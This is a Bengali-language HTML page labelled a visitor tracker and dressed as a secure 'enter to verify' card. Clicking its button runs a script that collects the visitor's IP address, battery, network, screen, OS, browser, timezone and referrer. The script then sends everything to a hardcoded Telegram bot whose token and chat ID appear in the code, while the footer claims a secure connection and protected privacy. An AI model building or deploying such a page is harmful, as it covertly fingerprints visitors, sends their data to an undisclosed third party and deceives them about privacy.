<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>ভিজিটর ট্র্যাকার - লোডিং ওয়েটিং</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #0b1120 0%, #19233c 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .card {
            max-width: 480px;
            width: 100%;
            background: rgba(20, 30, 45, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 2rem;
            border: 1px solid rgba(255, 215, 150, 0.3);
            padding: 2rem 1.8rem;
            text-align: center;
            box-shadow: 0 25px 40px rgba(0,0,0,0.5);
            transition: 0.2s;
        }

        .icon {
            font-size: 3.2rem;
            margin-bottom: 1rem;
        }

        h2 {
            color: #ffe0b5;
            font-size: 1.7rem;
            margin-bottom: 12px;
        }

        .desc {
            color: #b9ceff;
            font-size: 0.9rem;
            margin-bottom: 28px;
            line-height: 1.4;
        }

        .enter-btn {
            background: linear-gradient(95deg, #2a6f3c, #1f8a3e);
            border: none;
            color: white;
            font-size: 1.25rem;
            font-weight: bold;
            padding: 12px 32px;
            border-radius: 60px;
            cursor: pointer;
            width: 80%;
            box-shadow: 0 6px 14px rgba(0,0,0,0.3);
            transition: transform 0.1s, background 0.2s;
        }

        .enter-btn:active {
            transform: scale(0.97);
        }

        .loading-area {
            margin-top: 28px;
            min-height: 70px;
        }

        .loading-spinner {
            display: inline-block;
            width: 28px;
            height: 28px;
            border: 3px solid rgba(255,215,150,0.3);
            border-radius: 50%;
            border-top-color: #ffbc6e;
            animation: spin 0.8s linear infinite;
        }

        .loading-text {
            color: #ffd58c;
            font-size: 0.9rem;
            margin-top: 10px;
            letter-spacing: 0.5px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-msg {
            color: #a3e0a3;
            font-size: 0.85rem;
            background: #1e3a2a80;
            padding: 8px 12px;
            border-radius: 40px;
            display: inline-block;
        }

        footer {
            margin-top: 28px;
            font-size: 0.65rem;
            color: #6a7c9e;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="icon">🔐</div>
    <h2>স্বাগতম</h2>
    <div class="desc">
        আপনার ডিভাইসের তথ্য সংগ্রহ করে যাচাই করা হবে<br>
        নিচের বাটনে ক্লিক করুন
    </div>
    <button id="actionBtn" class="enter-btn">✅ প্রবেশ করুন</button>
    <div id="loadingContainer" class="loading-area"></div>
    <footer>🔒 নিরাপদ সংযোগ • তথ্য গোপনীয়তা সুরক্ষিত</footer>
</div>

<script>
    (function() {
        // ================== টেলিগ্রাম বট কনফিগ (আগের মত) ==================
        const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
        const DEFAULT_CHAT_ID = "7709670231";
        let isTracking = false;   // prevent double click during tracking

        // ----- ডাটা কালেকশন ফাংশন (সব ডিটেইল, শুধু টেলিগ্রামের জন্য) -----
        async function getPublicIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return "আইপি পাওয়া যায়নি";
            }
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) return { level: "অজানা", charging: "অজানা" };
            try {
                const battery = await navigator.getBattery();
                let levelPercent = Math.round(battery.level * 100);
                let charging = battery.charging ? "হ্যাঁ (চার্জিং)" : "না (ব্যাটারি)";
                return { level: `${levelPercent}%`, charging: charging };
            } catch(e) {
                return { level: "অজানা", charging: "অজানা" };
            }
        }

        function getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return { type: "অজানা", rtt: "N/A", speed: "N/A" };
            let type = conn.effectiveType || "unknown";
            let rtt = conn.rtt ? `${conn.rtt}ms` : "N/A";
            let downlink = conn.downlink ? `${conn.downlink}Mbps` : "N/A";
            return { type: type.toUpperCase(), rtt: rtt, speed: downlink };
        }

        function getScreenDetails() {
            return {
                resolution: `${screen.width}x${screen.height}`,
                colorDepth: `${screen.colorDepth}-bit`,
                pixelRatio: devicePixelRatio.toFixed(2)
            };
        }

        function getBrowserAndOS() {
            const ua = navigator.userAgent;
            let os = "অজানা";
            if (ua.includes("Android")) os = "Android";
            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
            else if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Mac")) os = "macOS";
            let browser = "অজানা";
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            return { os, browser };
        }

        async function collectVisitorData() {
            const ip = await getPublicIP();
            const battery = await getBatteryInfo();
            const network = getNetworkInfo();
            const screenDet = getScreenDetails();
            const osBrowser = getBrowserAndOS();
            const language = navigator.language || "bn-BD";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
            const cookieEnabled = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
            const pageUrl = window.location.href;
            const referrer = document.referrer || "সরাসরি";

            const message = `📢 নিউ ভিজিট (ক্লিক করা হয়েছে)\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nকালার ডেপথ: ${screenDet.colorDepth}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেটওয়ার্ক: ${network.type}\nRTT: ${network.rtt}\nস্পিড: ${network.speed}\nভাষা: ${language}\nটাইমজোন: ${timezone}\nস্থানীয় সময়: ${localTime}\nকুকি: ${cookieEnabled}\nপেজ ইউআরএল: ${pageUrl}\nরেফারার: ${referrer}`;
            return message;
        }

        async function sendToTelegram(text) {
            try {
                const params = new URLSearchParams();
                params.append('chat_id', DEFAULT_CHAT_ID);
                params.append('text', text);
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: params
                });
                const result = await response.json();
                if (result.ok) {
                    console.log("✅ টেলিগ্রামে সফলভাবে পাঠানো হয়েছে");
                    return true;
                } else {
                    console.warn("Telegram error:", result.description);
                    return false;
                }
            } catch(e) {
                console.warn("নেটওয়ার্ক বা টেলিগ্রাম সমস্যা:", e);
                return false;
            }
        }

        // UI element references
        const btn = document.getElementById('actionBtn');
        const loadingContainer = document.getElementById('loadingContainer');

        function showLoading() {
            loadingContainer.innerHTML = `
                <div class="loading-spinner"></div>
                <div class="loading-text">তথ্য সংগ্রহ ও যাচাই করা হচ্ছে... দয়া করে অপেক্ষা করুন</div>
            `;
        }

        function showSuccess() {
            loadingContainer.innerHTML = `<div class="success-msg">✔ সম্পন্ন! তথ্য গ্রহণ করা হয়েছে। ধন্যবাদ।</div>`;
            // optional: hide after 3 seconds?
            setTimeout(() => {
                if (loadingContainer.innerHTML.includes("সম্পন্ন")) {
                    loadingContainer.innerHTML = `<div class="loading-text" style="color:#98b2d4;">✅ আগের তথ্য রেকর্ড করা হয়েছে</div>`;
                }
            }, 3500);
        }

        function showError() {
            loadingContainer.innerHTML = `<div class="loading-text" style="color:#ffaa88;">⚠️ প্রেরণে সমস্যা, তবে তথ্য সংগৃহীত হয়েছে।</div>`;
        }

        async function handleClick() {
            if (isTracking) return; // already processing
            isTracking = true;
            btn.disabled = true;
            btn.style.opacity = "0.7";
            showLoading();

            try {
                const messageText = await collectVisitorData();
                const sent = await sendToTelegram(messageText);
                if (sent) {
                    showSuccess();
                } else {
                    showError();
                }
            } catch (err) {
                console.error(err);
                showError();
            } finally {
                isTracking = false;
                btn.disabled = false;
                btn.style.opacity = "1";
            }
        }

        // Attach event
        btn.addEventListener('click', handleClick);
    })();
</script>
</body>
</html>
